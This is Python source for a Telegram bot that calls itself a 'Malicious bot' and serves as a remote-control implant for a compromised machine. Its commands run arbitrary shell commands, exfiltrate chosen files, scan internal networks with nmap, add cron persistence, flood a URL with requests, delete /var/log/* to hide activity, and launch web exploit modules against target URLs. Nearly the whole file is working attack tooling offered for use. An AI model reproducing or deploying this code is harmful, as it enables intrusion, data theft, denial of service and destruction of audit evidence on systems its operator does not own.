import logging
import asyncio
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
from telegram import Update
from config import TELEGRAM_TOKEN, ADMIN_USER_ID
from scanner import SCANNERS
from utils import check_tools, summarize_text, ai_explain
from io import BytesIO
from dotenv import load_dotenv
import os

# Import all exploit modules dynamically
from exploit import EXPLOITS

# Load environment variables from .env file
load_dotenv()

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)

def is_authorized(update: Update) -> bool:
    return update.effective_user and update.effective_user.id == ADMIN_USER_ID

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Malicious bot at your service. Use /help to see commands.")

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    help_text = "Available commands:\n"
    help_text += "/start - Welcome message\n"
    help_text += "/help - This help menu\n"
    help_text += "/exec <cmd> - Execute command (authorized only)\n"
    help_text += "/get_file <path> - Exfiltrate file\n"
    help_text += "/scan_network <subnet> - Nmap scan\n"
    help_text += "/persist - Add cron persistence\n"
    help_text += "/ddos <url> [count] - Demonstrate DDoS\n"
    help_text += "/auto_attack - Begin automated scan loop\n"
    help_text += "/clear_logs - Delete logs\n"
    help_text += "/scan <target> - Run vulnerability scanners\n"
    help_text += "/summarize <text/file> - Summarize text or file\n"
    help_text += "/explain <text> - AI explanation\n"
    # Add all exploit modules from EXPLOITS
    help_text += "\n---\nExploit modules:\n"
    for cmd, cls in EXPLOITS.items():
        help_text += f"/{cmd} <url> <param> - {getattr(cls, 'description', cls.__name__)}\n"
    await update.message.reply_text(help_text)

######################
# 1. Remote Shell
######################
async def exec_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_authorized(update):
        return
    command = " ".join(context.args)
    import subprocess
    try:
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        await update.message.reply_text(output.decode())
    except Exception as e:
        await update.message.reply_text(f"Error: {e}")

######################
# 2. File Exfiltration
######################
async def get_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_authorized(update):
        return
    path = " ".join(context.args)
    try:
        with open(path, "rb") as f:
            await update.message.reply_document(f, filename=path.split("/")[-1])
    except Exception as e:
        await update.message.reply_text(f"Failed to read file: {e}")

######################
# 3. Internal Network Scan
######################
async def scan_network(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_authorized(update):
        return
    subnet = " ".join(context.args)
    import subprocess
    try:
        output = subprocess.check_output(f"nmap -A {subnet}", shell=True)
        await update.message.reply_text(output.decode())
    except Exception as e:
        await update.message.reply_text(f"Error: {e}")

######################
# 4. Persistence (Linux cronjob)
######################
async def persist(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_authorized(update):
        return
    import os
    bot_path = os.path.abspath(__file__)
    cron_line = f"@reboot python3 {bot_path}\n"
    try:
        os.system(f'(crontab -l; echo "{cron_line}") | crontab -')
        await update.message.reply_text("Persistence added via cron.")
    except Exception as e:
        await update.message.reply_text(f"Error: {e}")

######################
# 5. DDoS (demonstration, don't use)
######################
async def ddos(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_authorized(update):
        return
    import requests
    if not context.args:
        await update.message.reply_text("Usage: /ddos <url> [count]")
        return
    url = context.args[0]
    count = int(context.args[1]) if len(context.args) > 1 else 100
    await update.message.reply_text(f"Starting DDoS on {url} with {count} requests!")
    for _ in range(count):
        try:
            requests.get(url, timeout=1)
        except Exception:
            pass
    await update.message.reply_text("DDoS done (demo only).")

######################
# 6. Automated Attack (scan targets periodically)
######################
targets = ["http://example.com", "http://testphp.vulnweb.com"]

async def auto_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_authorized(update):
        return
    await update.message.reply_text("Starting automated attack loop!")
    while True:
        for target in targets:
            await update.message.reply_text(f"Scanning {target}")
            # Call your real scan logic here, e.g.:
            # await scan_target(target)
        await asyncio.sleep(3600)  # repeat every hour

######################
# 7. Stealth: Delete logs
######################
async def clear_logs(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_authorized(update):
        return
    import os
    os.system("rm -rf /var/log/*")
    await update.message.reply_text("Logs deleted.")

######################
# 8. Standard scan, summarize, explain (for completeness)
######################
async def scan(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_authorized(update):
        await update.message.reply_text("You are not authorized to use this bot.")
        return
    if not context.args:
        await update.message.reply_text("Usage: /scan <url or endpoint>")
        return
    target = context.args[0]
    await update.message.reply_text(f"Starting scan for {target} (may take a while)...")
    try:
        results = await asyncio.gather(
            *(scanner(target).scan() for scanner in SCANNERS if scanner.is_installed()),
            return_exceptions=True
        )
        summary = ""
        detailed = ""
        for scanner_cls, result in zip([s for s in SCANNERS if s.is_installed()], results):
            if isinstance(result, Exception):
                summary += f"{scanner_cls.name}: Error occurred.\n"
                detailed += f"=== {scanner_cls.name} ===\nError: {result}\n\n"
            else:
                summary += f"{scanner_cls.name}: {result['summary']}\n"
                detailed += f"=== {scanner_cls.name} ===\n{result['detailed']}\n\n"
        await update.message.reply_text(f"Summary:\n{summary}")

        with open("detailed_report.txt", "w", encoding="utf-8") as f:
            f.write(detailed)
        detailed_bytes = detailed.encode()
        bio = BytesIO(detailed_bytes)
        bio.name = "detailed_report.txt"
        bio.seek(0)
        await update.message.reply_document(document=bio, filename="detailed_report.txt")
    except Exception as e:
        await update.message.reply_text(f"Scan failed: {e}")

async def summarize(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_authorized(update):
        await update.message.reply_text("You are not authorized to use this bot.")
        return
    if not context.args:
        await update.message.reply_text("Usage: /summarize <text or filename>")
        return
    input_text = " ".join(context.args)
    # Check if a file with the given name exists
    if os.path.exists(input_text) and os.path.isfile(input_text):
        try:
            with open(input_text, "r", encoding="utf-8") as f:
                content = f.read()
            summary = summarize_text(content)
            await update.message.reply_text(f"🤖 Summary of {input_text}:\n{summary}")
        except Exception as e:
            await update.message.reply_text(f"Failed to summarize file: {e}")
    else:
        summary = summarize_text(input_text)
        await update.message.reply_text(f"🤖 Summary:\n{summary}")

async def explain(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_authorized(update):
        await update.message.reply_text("You are not authorized to use this bot.")
        return
    if not context.args:
        await update.message.reply_text("Usage: /explain <finding or text to explain>")
        return
    text = " ".join(context.args)
    ai_explanation = ai_explain(text)
    await update.message.reply_text(f"🤖 AI Explanation:\n{ai_explanation}")

######################
# 9. Exploit modules (dynamic)
######################
async def generic_exploit(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_authorized(update):
        await update.message.reply_text("Unauthorized.")
        return
    command = update.message.text.split()[0][1:]
    exploit_cls = EXPLOITS.get(command)
    if not exploit_cls:
        await update.message.reply_text("Unknown exploit command.")
        return

    # For modules that only need <url>
    url_only_modules = {"xxe", "csrf", "fileupload"}
    if command in url_only_modules:
        if len(context.args) < 1:
            await update.message.reply_text(f"Usage: /{command} <url>")
            return
        url = context.args[0]
        exploit = exploit_cls(url)
    else:
        if len(context.args) < 2:
            await update.message.reply_text(f"Usage: /{command} <url> <param>")
            return
        url, param = context.args[0], context.args[1]
        exploit = exploit_cls(url, param)

    custom_payloads = context.args[2:] if len(context.args) > 2 else None
    result = await exploit.exploit(custom_payloads)
    await update.message.reply_text(f"Summary:\n{result['summary']}\n\nDetails:\n{result['detailed']}")

def main():
    app = ApplicationBuilder().token(TELEGRAM_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("exec", exec_cmd))
    app.add_handler(CommandHandler("get_file", get_file))
    app.add_handler(CommandHandler("scan_network", scan_network))
    app.add_handler(CommandHandler("persist", persist))
    app.add_handler(CommandHandler("ddos", ddos))
    app.add_handler(CommandHandler("auto_attack", auto_attack))
    app.add_handler(CommandHandler("clear_logs", clear_logs))
    app.add_handler(CommandHandler("scan", scan))
    app.add_handler(CommandHandler("summarize", summarize))
    app.add_handler(CommandHandler("explain", explain))
    # Dynamically add exploit module handlers
    for cmd in EXPLOITS.keys():
        app.add_handler(CommandHandler(cmd, generic_exploit))
    print("Malicious bot is starting...")
    app.run_polling()

if __name__ == "__main__":
    main()
